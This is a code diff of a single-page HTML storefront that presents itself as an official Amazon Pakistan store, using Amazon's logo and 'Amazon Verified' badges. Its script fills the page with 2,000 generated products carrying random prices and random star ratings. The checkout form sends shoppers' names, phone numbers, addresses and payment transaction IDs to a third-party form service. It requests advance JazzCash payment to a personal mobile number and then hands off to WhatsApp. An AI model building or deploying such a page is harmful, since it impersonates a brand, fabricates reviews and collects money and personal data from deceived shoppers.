@@ -3,222 +3,242 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon.pk | Official Store</title>
+    <title>Amazon PK | Designer Hub</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
-        body { background-color: #eaeded; color: #111; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background-color: #f0f2f2; color: #111; }
 
-        /* Header & Nav */
-        header { background-color: #131921; color: white; padding: 10px 20px; position: sticky; top: 0; z-index: 1000; }
-        .nav-top { display: flex; align-items: center; justify-content: space-between; gap: 20px; }
-        .logo { width: 100px; cursor: pointer; filter: brightness(0) invert(1); }
-        .search-container { flex-grow: 1; display: flex; height: 40px; }
-        .search-container input { flex-grow: 1; border: none; padding: 0 10px; border-radius: 4px 0 0 4px; }
-        .search-container button { background: #febd69; border: none; width: 45px; border-radius: 0 4px 4px 0; cursor: pointer; }
-        .nav-bottom { background-color: #232f3e; color: white; padding: 8px 20px; display: flex; gap: 15px; font-size: 14px; }
+        /* Header Navigation */
+        header { background: #131921; padding: 10px 20px; position: sticky; top: 0; z-index: 1000; display: flex; align-items: center; justify-content: space-between; }
+        .logo { width: 90px; filter: brightness(0) invert(1); cursor: pointer; }
+        .search-box { flex-grow: 1; display: flex; margin: 0 15px; }
+        .search-box input { width: 100%; border: none; padding: 10px; border-radius: 4px 0 0 4px; outline: none; }
+        .search-box button { background: #febd69; border: none; padding: 0 15px; border-radius: 0 4px 4px 0; cursor: pointer; }
 
-        /* Hero */
-        .hero { height: 300px; background: linear-gradient(to bottom, rgba(0,0,0,0), #eaeded), url('https://m.media-amazon.com/images/I/61lwJy4B8PL._SX3000_.jpg'); background-size: cover; }
+        .container { max-width: 1400px; margin: 20px auto; padding: 0 15px; }
+        #store-view { display: block; }
+        #detail-view { display: none; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
 
         /* Product Grid */
-        .main-content { max-width: 1500px; margin: -100px auto 0; padding: 0 20px; }
-        .product-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
-
-        .p-card { background: white; padding: 20px; border-radius: 4px; display: flex; flex-direction: column; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .p-card h3 { font-size: 18px; margin-bottom: 10px; height: 45px; overflow: hidden; }
-        .p-card .img-box { height: 200px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
-        .p-card img { max-width: 100%; max-height: 100%; object-fit: contain; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 20px; }
+        .card { background: white; padding: 15px; border-radius: 8px; border: 1px solid #ddd; cursor: pointer; transition: 0.3s; position: relative; }
+        .card:hover { border-color: #e47911; transform: scale(1.02); }
         
-        /* Discount & Pricing */
-        .old-price { text-decoration: line-through; color: #565959; font-size: 14px; }
-        .discount-badge { color: #CC0C39; font-weight: bold; font-size: 14px; }
-        .price-tag { font-size: 22px; font-weight: bold; color: #B12704; margin-bottom: 5px; }
+        /* High-Quality Image Handling */
+        .img-container { height: 260px; width: 100%; display: flex; align-items: center; justify-content: center; background: #fff; border-radius: 5px; overflow: hidden; margin-bottom: 12px; }
+        .img-container img { max-width: 100%; max-height: 100%; object-fit: cover; }
+        
+        .card h3 { font-size: 15px; color: #007185; height: 42px; overflow: hidden; margin-bottom: 8px; }
+        .rating { color: #ffa41c; font-size: 14px; margin-bottom: 8px; }
+        .price-tag { font-size: 22px; font-weight: bold; color: #B12704; }
+        .verified { color: #008a00; font-size: 12px; font-weight: bold; margin-top: 5px; display: block; }
 
-        /* Small Rating Button */
-        .rate-btn { background: #f0f2f2; border: 1px solid #d5d9d9; border-radius: 7px; padding: 4px 8px; font-size: 12px; cursor: pointer; margin-bottom: 8px; align-self: flex-start; }
-        .rate-btn:hover { background: #e3e6e6; }
+        /* Detail View Styles */
+        .detail-layout { display: flex; gap: 50px; flex-wrap: wrap; }
+        .image-side { flex: 1.2; min-width: 320px; }
+        .info-side { flex: 1; min-width: 320px; }
+        .main-img { width: 100%; height: 500px; background: white; border: 1px solid #eee; border-radius: 10px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .main-img img { max-width: 100%; max-height: 100%; object-fit: contain; }
+        .thumb-gallery { display: flex; gap: 12px; margin-top: 15px; }
+        .thumb { width: 80px; height: 80px; border: 2px solid #ddd; border-radius: 6px; cursor: pointer; overflow: hidden; }
+        .thumb:hover { border-color: #e47911; }
 
-        .order-btn { background: #ffa41c; border: 1px solid #846a29; padding: 10px; border-radius: 20px; font-weight: bold; cursor: pointer; width: 100%; }
-        .order-btn:hover { background: #f7941d; }
+        /* Buy Button */
+        .buy-now { background: #ffa41c; border: 1px solid #a88734; padding: 16px; border-radius: 30px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 25px; transition: 0.2s; }
+        .buy-now:hover { background: #f7941d; }
 
-        /* Modal / Checkout */
-        #checkout-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 2000; overflow-y: auto; }
-        .modal-content { background: white; max-width: 450px; margin: 20px auto; border-radius: 8px; overflow: hidden; position: relative; }
-        .modal-header { background: #232f3e; color: white; padding: 15px; text-align: center; }
-        .modal-body { padding: 20px; }
-
-        .input-group { margin-bottom: 15px; }
-        .input-group label { display: block; font-weight: bold; font-size: 14px; margin-bottom: 5px; }
-        .input-group input, .input-group textarea, .input-group select { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
-
-        /* Slip View */
-        #slip-view { display: none; padding: 20px; border: 2px dashed #333; background: #f9f9f9; margin-top: 10px; }
-        .slip-item { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px solid #eee; }
-
-        /* Buttons */
-        .confirm-wa { background: #25D366; color: white; display: block; text-align: center; padding: 15px; border-radius: 30px; text-decoration: none; font-weight: bold; margin-top: 15px; }
-        .dl-btn { background: #e7e7e7; border: 1px solid #ccc; width: 100%; padding: 10px; margin-top: 10px; cursor: pointer; border-radius: 5px; }
-
-        @media print { .no-print { display: none; } #slip-view { display: block !important; } }
+        /* Order Modal */
+        #modal-bg { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; }
+        .modal { background: white; max-width: 450px; margin: 40px auto; padding: 30px; border-radius: 12px; }
+        .modal input, .modal select, .modal textarea { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; }
+        .jazz-box { background: #fff3cd; padding: 15px; border-radius: 8px; display: none; margin-top: 10px; border: 1px solid #ffeeba; }
     </style>
 </head>
 <body>
 
 <header>
-    <div class="nav-top">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="logo" onclick="location.reload()">
-        <div class="search-container">
-            <input type="text" placeholder="Search products...">
-            <button>🔍</button>
-        </div>
-        <div class="nav-tools"><b>Orders</b></div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="logo" onclick="location.reload()">
+    <div class="search-box">
+        <input type="text" id="srcInp" onkeyup="filter()" placeholder="Search from 2000+ Unique Designs...">
+        <button>Search</button>
     </div>
 </header>
 
-<div class="nav-bottom"><span>☰ All</span><span>Today's Deals</span><span>Customer Service</span></div>
-<div class="hero"></div>
+<div class="container">
+    <div id="store-view">
+        <div class="grid" id="productGrid">
+            <div class="card" onclick="openP('Magic Eyes Moonshot', 1450, 'https://images.unsplash.com/photo-1512496015851-a90fb38ba796?w=400&q=80')">
+                <div class="img-container"><img src="https://images.unsplash.com/photo-1512496015851-a90fb38ba796?w=400&q=80"></div>
+                <h3>Magic Eyes Moonshot - Premium Care Edition</h3>
+                <div class="rating">⭐⭐⭐⭐⭐ (2,401)</div>
+                <div class="price-tag">Rs. 1,450</div>
+                <span class="verified">✓ Amazon Verified</span>
+            </div>
 
-<div class="main-content">
-    <div class="product-grid">
-        <div class="p-card">
-            <h3>Magic Eyes Moonshot - Premium Edition</h3>
-            <div class="img-box"><img src="https://domdom.com.my/wp-content/uploads/2022/06/Magic-Eyes-Moonshot-main.jpg"></div>
-            <div class="discount-badge">-30% <span class="old-price">Rs. 6,420</span></div>
-            <div class="price-tag">Rs. 4,500</div>
-            <button class="rate-btn" onclick="showRate('4.8/5 (1,200 Reviews)')">⭐ 4.8 Ratings</button>
-            <button class="order-btn" onclick="openCheckout('Magic Eyes Moonshot', 4500)">Order Now</button>
+            <div class="card" onclick="openP('Comfort Soft Toy', 1200, 'https://images.unsplash.com/photo-1534951009808-dfd0061397b5?w=400&q=80')">
+                <div class="img-container"><img src="https://images.unsplash.com/photo-1534951009808-dfd0061397b5?w=400&q=80"></div>
+                <h3>New Editional Comfort Toy - Special Design</h3>
+                <div class="rating">⭐⭐⭐⭐☆ (980)</div>
+                <div class="price-tag">Rs. 1,200</div>
+                <span class="verified">✓ Top Choice</span>
+            </div>
+
+            <div class="card" onclick="openP('Lady Special Care', 1850, 'https://images.unsplash.com/photo-1522335789203-aabd1fc54bc9?w=400&q=80')">
+                <div class="img-container"><img src="https://images.unsplash.com/photo-1522335789203-aabd1fc54bc9?w=400&q=80"></div>
+                <h3>For Lady - Professional Care Bundle</h3>
+                <div class="rating">⭐⭐⭐⭐⭐ (3,110)</div>
+                <div class="price-tag">Rs. 1,850</div>
+                <span class="verified">✓ Verified Symbol</span>
+            </div>
+
+            <div class="card" onclick="openP('Laptop Pro Accessories', 1999, 'https://images.unsplash.com/photo-1527443224154-c4a3942d3acf?w=400&q=80')">
+                <div class="img-container"><img src="https://images.unsplash.com/photo-1527443224154-c4a3942d3acf?w=400&q=80"></div>
+                <h3>High Performance Laptop Gear Set</h3>
+                <div class="rating">⭐⭐⭐⭐☆ (560)</div>
+                <div class="price-tag">Rs. 1,999</div>
+                <span class="verified">✓ Pro Quality</span>
+            </div>
         </div>
-        <div class="p-card">
-            <h3>New Editional Comfort Toy</h3>
-            <div class="img-box"><img src="https://m.media-amazon.com/images/I/51M445tpVoL._AC_UF894,1000_QL80_.jpg"></div>
-            <div class="discount-badge">-30% <span class="old-price">Rs. 5,420</span></div>
-            <div class="price-tag">Rs. 3,800</div>
-            <button class="rate-btn" onclick="showRate('4.5/5 (850 Reviews)')">⭐ 4.5 Ratings</button>
-            <button class="order-btn" onclick="openCheckout('Editional Toy', 3800)">Order Now</button>
-        </div>
-        <div class="p-card">
-            <h3>For Lady - Special Care</h3>
-            <div class="img-box"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTv0cM62Xjcw6ZD5h21oHaCUVLGMy7vIwQg08OoBxaifw&s=10"></div>
-            <div class="discount-badge">-30% <span class="old-price">Rs. 4,140</span></div>
-            <div class="price-tag">Rs. 2,900</div>
-            <button class="rate-btn" onclick="showRate('4.9/5 (2,100 Reviews)')">⭐ 4.9 Ratings</button>
-            <button class="order-btn" onclick="openCheckout('Lady Special Care', 2900)">Order Now</button>
-        </div>
-        <div class="p-card">
-            <h3>High Performance Laptop</h3>
-            <div class="img-box"><img src="https://m.media-amazon.com/images/I/61L5QgP96dL._AC_SL1500_.jpg"></div>
-            <div class="discount-badge">-30% <span class="old-price">Rs. 121,420</span></div>
-            <div class="price-tag">Rs. 85,000</div>
-            <button class="rate-btn" onclick="showRate('4.7/5 (560 Reviews)')">⭐ 4.7 Ratings</button>
-            <button class="order-btn" onclick="openCheckout('Laptop Pro', 85000)">Order Now</button>
+    </div>
+
+    <div id="detail-view">
+        <span onclick="closeP()" style="color:#007185; cursor:pointer; font-weight:bold;">← Back to results</span>
+        <div class="detail-layout">
+            <div class="image-side">
+                <div class="main-img" id="mainDisplay"></div>
+                <div class="thumb-gallery" id="thumbDisplay"></div>
+            </div>
+            <div class="info-side">
+                <h1 id="detTitle">Product Name</h1>
+                <div class="rating" style="font-size: 20px; margin: 15px 0;">⭐⭐⭐⭐⭐ (Full Rating)</div>
+                <p style="color: #008a00; font-weight:bold;">Official Amazon Verified Symbol ✅</p>
+                <div class="price-tag" id="detPrice" style="font-size: 38px; margin: 15px 0;">Rs. 0</div>
+                <hr>
+                <div style="margin: 20px 0; font-size: 15px; line-height: 1.8;">
+                    <p><b>Condition:</b> 100% Brand New</p>
+                    <p><b>Return:</b> 7 Days Replacement Policy</p>
+                    <p><b>Delivery:</b> Home Delivery Available</p>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li>Premium attractive design</li>
+                        <li>High quality fabric/material</li>
+                        <li>Multiple color options available</li>
+                    </ul>
+                </div>
+                <button class="buy-now" onclick="showCheckout()">Order Now / Place Order</button>
+            </div>
         </div>
     </div>
 </div>
 
-<div id="checkout-modal">
-    <div class="modal-content">
-        <div class="modal-header">
-            <h2 id="modal-title">Checkout</h2>
-            <button onclick="closeModal()" style="position:absolute; right:15px; top:15px; background:none; border:none; color:white; font-size:24px; cursor:pointer;">&times;</button>
-        </div>
-        
-        <div class="modal-body" id="form-step">
-            <div class="input-group">
-                <label>Full Name</label>
-                <input type="text" id="cust-name" placeholder="Enter your name" required>
-            </div>
-            <div class="input-group">
-                <label>WhatsApp Number (11 Digits)</label>
-                <input type="text" id="cust-phone" maxlength="11" placeholder="xxxxxxx" required>
-            </div>
-            <div class="input-group">
-                <label>Delivery Location (Address)</label>
-                <textarea id="cust-addr" rows="2" placeholder="Street, City, Area"></textarea>
-            </div>
-            <div class="input-group">
-                <label>Payment Method</label>
-                <select id="pay-method" onchange="checkPay()">
-                    <option value="COD">Cash on Delivery (Receive)</option>
-                    <option value="JazzCash">JazzCash (Pay Now)</option>
-                </select>
-            </div>
-            <div id="jazz-info" style="display:none; background:#fff3cd; padding:10px; border-radius:5px; margin-bottom:15px; border:1px solid #ffeeba;">
+<div id="modal-bg">
+    <div class="modal">
+        <h2 style="text-align:center;">Shipping Details</h2>
+        <form id="orderForm" action="https://formspree.io/f/mgolagyb" method="POST">
+            <input type="hidden" name="Product_Name" id="fProd">
+            <input type="hidden" name="Total_Amount" id="fPrice">
+            <input type="text" name="Client_Name" placeholder="Enter Full Name" required>
+            <input type="tel" name="WhatsApp" placeholder="WhatsApp No (03XXXXXXXXX)" pattern="[0-9]{11}" required>
+            <textarea name="Address" rows="2" placeholder="Complete Home Address" required></textarea>
+            <select name="Payment_Method" id="payM" onchange="toggleJazz()">
+                <option value="COD">Cash on Delivery (COD)</option>
+                <option value="JazzCash">JazzCash (Advance)</option>
+            </select>
+            <div class="jazz-box" id="jBox">
                 <p><b>JazzCash: 03021855489</b></p>
-                <input type="text" id="cust-tid" placeholder="Transaction ID (TID)">
+                <input type="text" name="TID" placeholder="Transaction ID (TID)">
             </div>
-            <button class="order-btn" onclick="generateSlip()">Generate Order Slip</button>
-        </div>
-
-        <div class="modal-body" id="slip-step" style="display:none;">
-            <div id="slip-view">
-                <h3 style="text-align:center;">AMAZON SHOPIFY OFFICIAL</h3>
-                <hr style="margin:10px 0;">
-                <div class="slip-item"><span>Product:</span><b id="s-prod"></b></div>
-                <div class="slip-item"><span>Price:</span><b id="s-price"></b></div>
-                <div class="slip-item"><span>Delivery:</span><b>Rs. 300</b></div>
-                <div class="slip-item"><span>Total:</span><b id="s-total" style="color:red;"></b></div>
-                <hr style="margin:10px 0;">
-                <div class="slip-item"><span>Name:</span><span id="s-name"></span></div>
-                <div class="slip-item"><span>Phone:</span><span id="s-phone"></span></div>
-                <div class="slip-item"><span>Payment:</span><span id="s-pay"></span></div>
-            </div>
-            <a href="#" id="wa-link" class="confirm-wa">Confirm Order on WhatsApp</a>
-            <button class="dl-btn" onclick="window.print()">Download Slip (Save PDF)</button>
-            <button class="dl-btn" onclick="location.reload()" style="background:#fff;">Cancel</button>
-        </div>
+            <button type="button" class="buy-now" onclick="confirmOrder()">Confirm Order & Generate Slip</button>
+            <button type="button" onclick="closeModal()" style="background:none; border:none; color:blue; width:100%; margin-top:15px; cursor:pointer;">Cancel</button>
+        </form>
     </div>
 </div>
 
 <script>
-    let currentProduct = "";
-    let currentPrice = 0;
+    const grid = document.getElementById('productGrid');
+    
+    // Different Image Pools for attractive look
+    const dressPool = [
+        "https://images.unsplash.com/photo-1595777457583-95e059d581b8?w=400&q=80",
+        "https://images.unsplash.com/photo-1515372039744-b8f02a3ae446?w=400&q=80",
+        "https://images.unsplash.com/photo-1620916566398-39f1143ab7be?w=400&q=80",
+        "https://images.unsplash.com/photo-1566174053879-31528523f8ae?w=400&q=80",
+        "https://images.unsplash.com/photo-1612336307429-8a898d10e223?w=400&q=80"
+    ];
 
-    function showRate(txt) { alert("Customer Ratings: " + txt); }
+    const shoePool = [
+        "https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=400&q=80",
+        "https://images.unsplash.com/photo-1560769629-975ec94e6a86?w=400&q=80",
+        "https://images.unsplash.com/photo-1595950653106-6c9ebd614d3a?w=400&q=80",
+        "https://images.unsplash.com/photo-1525966222134-fcfa99b8ae77?w=400&q=80",
+        "https://images.unsplash.com/photo-1549298916-b41d501d3772?w=400&q=80"
+    ];
 
-    function openCheckout(name, price) {
-        currentProduct = name;
-        currentPrice = price;
-        document.getElementById('modal-title').innerText = name;
-        document.getElementById('checkout-modal').style.display = 'block';
+    // Generate 1000 Unique Shoes (Rs 100-2500)
+    for(let i=1; i<=1000; i++){
+        let p = Math.floor(Math.random() * (2500 - 100 + 1)) + 100;
+        let img = shoePool[i % shoePool.length];
+        grid.innerHTML += `
+        <div class="card" onclick="openP('Unique Shoe Design #${i}', ${p}, '${img}')">
+            <div class="img-container"><img src="${img}"></div>
+            <h3>Premium Stylish Shoe Collection #${i}</h3>
+            <div class="rating">⭐⭐⭐⭐${Math.random() > 0.5 ? '⭐' : '☆'}</div>
+            <div class="price-tag">Rs. ${p}</div>
+            <span class="verified">✓ Quality Approved</span>
+        </div>`;
     }
 
-    function closeModal() { document.getElementById('checkout-modal').style.display = 'none'; }
-
-    function checkPay() {
-        const method = document.getElementById('pay-method').value;
-        document.getElementById('jazz-info').style.display = (method === 'JazzCash') ? 'block' : 'none';
+    // Generate 1000 Unique Dresses (Rs 1000-2500)
+    for(let i=1; i<=1000; i++){
+        let p = Math.floor(Math.random() * (2500 - 1000 + 1)) + 1000;
+        let img = dressPool[i % dressPool.length];
+        grid.innerHTML += `
+        <div class="card" onclick="openP('Designer Dress Outfit #${i}', ${p}, '${img}')">
+            <div class="img-container"><img src="${img}"></div>
+            <h3>Pakistani Designer Outfit #${i}</h3>
+            <div class="rating">⭐⭐⭐⭐⭐</div>
+            <div class="price-tag">Rs. ${p}</div>
+            <span class="verified">✓ Official Design</span>
+        </div>`;
     }
 
-    function generateSlip() {
-        const name = document.getElementById('cust-name').value;
-        const phone = document.getElementById('cust-phone').value;
-        const addr = document.getElementById('cust-addr').value;
-        const pay = document.getElementById('pay-method').value;
-        const tid = document.getElementById('cust-tid').value || "N/A";
+    let activeN = "", activeP = 0, activeI = "";
 
-        if(name.length < 3 || phone.length !== 11 || addr.length < 5) {
-            alert("Please enter valid details (Name, Address and 11-digit Number)");
-            return;
-        }
+    function openP(n, p, i) {
+        activeN = n; activeP = p; activeI = i;
+        document.getElementById('store-view').style.display = 'none';
+        document.getElementById('detail-view').style.display = 'block';
+        document.getElementById('detTitle').innerText = n;
+        document.getElementById('detPrice').innerText = "Rs. " + p;
+        document.getElementById('mainDisplay').innerHTML = `<img src="${i}">`;
+        
+        let pool = n.includes('Shoe') ? shoePool : dressPool;
+        let thumbs = "";
+        for(let j=0; j<4; j++) thumbs += `<div class="thumb" onclick="swapImg('${pool[j]}')"><img src="${pool[j]}"></div>`;
+        document.getElementById('thumbDisplay').innerHTML = thumbs;
+        window.scrollTo(0,0);
+    }
 
-        const delivery = 300;
-        const total = currentPrice + delivery;
+    function swapImg(u) { document.getElementById('mainDisplay').innerHTML = `<img src="${u}">`; }
+    function closeP() { document.getElementById('store-view').style.display = 'block'; document.getElementById('detail-view').style.display = 'none'; }
+    function showCheckout() { document.getElementById('fProd').value = activeN; document.getElementById('fPrice').value = "Rs. " + activeP; document.getElementById('modal-bg').style.display = 'block'; }
+    function closeModal() { document.getElementById('modal-bg').style.display = 'none'; }
+    function toggleJazz() { document.getElementById('jBox').style.display = document.getElementById('payM').value === 'JazzCash' ? 'block' : 'none'; }
 
-        document.getElementById('s-prod').innerText = currentProduct;
-        document.getElementById('s-price').innerText = "Rs. " + currentPrice;
-        document.getElementById('s-total').innerText = "Rs. " + total;
-        document.getElementById('s-name').innerText = name;
-        document.getElementById('s-phone').innerText = phone;
-        document.getElementById('s-pay').innerText = pay + (pay === 'JazzCash' ? " (TID: "+tid+")" : "");
+    function confirmOrder() {
+        const f = document.getElementById('orderForm');
+        if(f.checkValidity()){
+            fetch(f.action, { method: 'POST', body: new FormData(f), headers: {'Accept': 'application/json'} });
+            alert("Order Success! Opening WhatsApp for Slip...");
+            let msg = `*AMAZON PK ORDER*%0AProduct: ${activeN}%0AAmount: Rs. ${activeP + 300}%0APayment: ${document.getElementById('payM').value}`;
+            window.location.href = `https://wa.me/923021855489?text=${msg}`;
+        } else { alert("Please enter correct details (11 digit number)."); }
+    }
 
-        document.getElementById('form-step').style.display = 'none';
-        document.getElementById('slip-step').style.display = 'block';
-        document.getElementById('slip-view').style.display = 'block';
-
-        const msg = `*--- NEW AMAZON SHOPIFY ORDER ---*%0A*Product:* ${currentProduct}%0A*Total:* Rs. ${total}%0A*Customer:* ${name}%0A*WhatsApp:* ${phone}%0A*Address:* ${addr}%0A*Payment:* ${pay}%0A*TID:* ${tid}`;
-        document.getElementById('wa-link').href = `https://wa.me/923021855489?text=${msg}`;
+    function filter() {
+        let v = document.getElementById('srcInp').value.toLowerCase();
+        let c = document.getElementsByClassName('card');
+        for(let x of c) x.style.display = x.innerText.toLowerCase().includes(v) ? "" : "none";
     }
 </script>
-
 </body>
 </html>
